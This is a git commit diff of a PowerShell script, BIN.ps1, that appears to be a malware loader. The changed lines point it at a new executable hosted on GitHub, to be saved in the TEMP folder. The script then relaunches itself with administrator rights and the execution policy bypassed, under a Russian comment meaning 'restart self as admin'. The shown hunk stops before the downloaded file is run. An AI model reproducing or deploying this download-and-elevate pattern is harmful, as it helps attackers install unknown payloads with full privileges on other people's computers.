dc86e5e490f7b478f9136b761c1115ed7bd6f8ab
ShramC <ShramC@proton.me>
2026-07-24 10:43:34 +0300

    BIN.ps1

--- BIN.ps1
+++ BIN.ps1
@@ -1,5 +1,5 @@
-$ExeURL = "https://github.com/ShramC/Ds/raw/refs/heads/main/loder.exe"
-$ExePath = "$env:TEMP\krakeh_loader.exe"
+$ExeURL = "https://github.com/ShramC/Ds/raw/refs/heads/main/7w.exe"
+$ExePath = "$env:TEMP\7w.exe"
 if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     # ПЕРЕЗАПУСК СЕБЯ ОТ АДМИНА
     Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
